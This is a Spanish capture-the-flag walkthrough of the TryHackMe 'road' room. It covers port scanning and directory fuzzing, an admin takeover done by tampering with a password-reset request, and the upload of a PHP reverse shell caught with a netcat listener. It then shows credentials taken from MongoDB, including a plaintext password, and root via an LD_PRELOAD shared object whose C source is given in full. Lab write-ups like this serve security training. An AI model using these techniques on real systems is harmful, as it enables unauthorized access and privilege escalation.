---
title: "road"
description: "road"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/road

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.141.243
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603211641.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80 -Pn 10.10.141.243
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603211720.png)

## Fuzzing

````
gobuster dir -u http://10.10.141.243 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603212307.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603212514.png)
Nos registramos
Vemos que usuario admin es admin@sky.thm

# Fase de ataque

Tenemos un apartado para cambiar la contraseña del usuario registrado sin tener la contraseña anterior , podemos intentar capturar la petición mediante Burp Suite y cambiar mi usuario por el de administrador
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603213142.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603213258.png)
Login como admin exitoso!

# LGI to PHP reverse shell

Copiamos una reverse shell
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603214141.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603214526.png)
Lo subimos al servidor
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603214357.png)
Nos ponemos en escucha por el puerto 443 para recibir la Shell

````
nc -nlvp 443
````

Buscamos
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603214736.png)
\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

````
stty rows 44 columns 184
````

# Privilege Escalation

ver puertos abiertos expuestos en localhost

````
ss -tl
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603220502.png)
Nos conectamos al mongo
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603221202.png)

````
show dbs
use backup
db.user.find()
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240603221642.png)
BahamasChapp123!@#

## Pivoting a otro usuario

Buscamos privilegios del usuario

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240604200837.png)
Vemos que tiene una variable y lo encontramos en https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path

## LD_PRELOAD

1. Creamos un programa en C en /tmp que lanza una terminal root llamdo shell.c

````
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
````

2. Compilamos

````
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
````

Se crea un archivo shell.so
3. Ejecutamos el shell con el comando con privilegios

````
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
````

\[+\] ==pwned!==
